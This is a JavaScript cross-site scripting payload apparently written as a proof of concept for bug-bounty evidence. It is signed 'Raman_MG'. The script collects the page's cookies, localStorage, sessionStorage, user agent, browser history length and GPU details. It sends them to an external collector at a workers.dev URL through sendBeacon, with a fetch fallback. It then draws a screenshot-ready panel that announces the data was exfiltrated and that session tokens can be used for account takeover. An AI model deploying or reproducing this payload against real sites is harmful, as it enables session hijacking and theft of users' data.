// WILD XSS — Raman_MG signature. Renders a self-documenting evidence panel (screenshot-ready)
// and exfiltrates the captured data to a persistent collector via sendBeacon (no CORS, clean console).
(() => {
  const COLLECTOR = "https://rmg-collector.ramanmgg1.workers.dev/"; // https://rmg-collector.<sub>.workers.dev/
  // ---- collect ----
  const cvs = document.createElement("canvas"),
    gl = cvs.getContext("webgl") || cvs.getContext("experimental-webgl"),
    dbg = gl && gl.getExtension("WEBGL_debug_renderer_info"),
    gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
    vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A";
  const ls = { ...localStorage }, ss = { ...sessionStorage };
  const cookieList = document.cookie ? document.cookie.split(";").map(s => s.trim()).filter(Boolean) : [];
  const data = {
    origin: location.origin, host: location.host, path: location.pathname, url: location.href,
    cookies: document.cookie, userAgent: navigator.userAgent,
    localStorage: ls, sessionStorage: ss, historyLength: history.length, gpu, vendor,
    capturedAt: new Date().toISOString()
  };
  // ---- exfil (sendBeacon primary; fetch keepalive fallback) ----
  const payload = "msg=" + encodeURIComponent(JSON.stringify(data));
  let sent = false;
  try { sent = navigator.sendBeacon(COLLECTOR, new Blob([payload], { type: "application/x-www-form-urlencoded" })); } catch (e) {}
  if (!sent) { try { fetch(COLLECTOR, { method: "POST", mode: "cors", keepalive: true, headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: payload }); } catch (e) {} }

  // ---- self-documenting on-screen evidence panel ----
  const clip = (v, n) => { v = String(v == null ? "" : v); return v.length > n ? v.slice(0, n) + "…" : v; };
  const lsKeys = Object.keys(ls), ssKeys = Object.keys(ss);
  const lsRows = lsKeys.slice(0, 14).map(k => "   " + clip(k, 34).padEnd(34) + " = " + clip(ls[k], 46)).join("\n")
    + (lsKeys.length > 14 ? "\n   …+" + (lsKeys.length - 14) + " more" : "");
  const ckRows = cookieList.slice(0, 14).map(c => "   " + clip(c, 78)).join("\n")
    + (cookieList.length > 14 ? "\n   …+" + (cookieList.length - 14) + " more" : "");

  const el = document.createElement("div");
  el.setAttribute("data-xss", "rmg");
  el.style.cssText = "position:absolute;top:20px;left:50%;transform:translateX(-50%);width:760px;max-width:95vw;background:linear-gradient(180deg,#04120a,#020a06);color:#8affc0;border:1px solid #0f6;border-radius:12px;padding:0 0 6px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;line-height:1.55;z-index:2147483647;box-shadow:0 0 40px #0f65,0 0 4px #0f6 inset;";
  try { document.documentElement.style.background = "#020a06"; } catch (e) {}
  const head = "<div style='background:#0f6;color:#02170d;font-weight:700;letter-spacing:.5px;padding:10px 16px;border-radius:12px 12px 0 0;display:flex;justify-content:space-between;'><span>⚡ XSS EXECUTED &nbsp;·&nbsp; by Raman_MG</span><span>" + (sent ? "◉ EXFILTRATED" : "◉ EXFIL(fetch)") + "</span></div>";
  const enc = s => String(s == null ? "" : s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
  const kv = (label, val, hot) => "<tr><td style='color:#4fbf85;padding:2px 12px;white-space:nowrap;vertical-align:top'>" + label + "</td><td style='color:" + (hot ? "#eaffea" : "#8affc0") + ";padding:2px 0;word-break:break-all'>" + enc(val) + "</td></tr>";
  const section = (title, body) => "<div style='color:#0f6;font-weight:700;margin:12px 16px 4px;border-top:1px dashed #0f63;padding-top:8px'>" + title + "</div><pre style='margin:0 16px;white-space:pre-wrap;word-break:break-all;color:#cfeede'>" + enc(body || "   (none)") + "</pre>";
  el.innerHTML = head
    + "<table style='margin:12px 4px 0'>"
    + kv("ORIGIN", data.origin, true)
    + kv("HOST", data.host, true)
    + kv("PATH", data.path)
    + kv("USER-AGENT", clip(data.userAgent, 90))
    + kv("GPU", clip(gpu + " · " + vendor, 90))
    + kv("HISTORY", data.historyLength + " entries")
    + kv("CAPTURED", data.capturedAt)
    + "</table>"
    + section("COOKIES (" + cookieList.length + ")", ckRows)
    + section("LOCALSTORAGE (" + lsKeys.length + " keys)", lsRows)
    + section("SESSIONSTORAGE (" + ssKeys.length + " keys)", ssKeys.slice(0, 14).map(k => "   " + clip(k, 34).padEnd(34) + " = " + clip(ss[k], 46)).join("\n"))
    + "<div style='color:#4fbf85;font-size:11px;padding:12px 16px 14px'>▸ All fields above were read by attacker-controlled JS in the page origin and exfiltrated to an external collector. On a logged-in victim, session tokens in the above stores are stolen → account takeover.</div>";
  const paint = () => document.body ? document.body.appendChild(el) : addEventListener("DOMContentLoaded", () => document.body.appendChild(el));
  paint();
})();
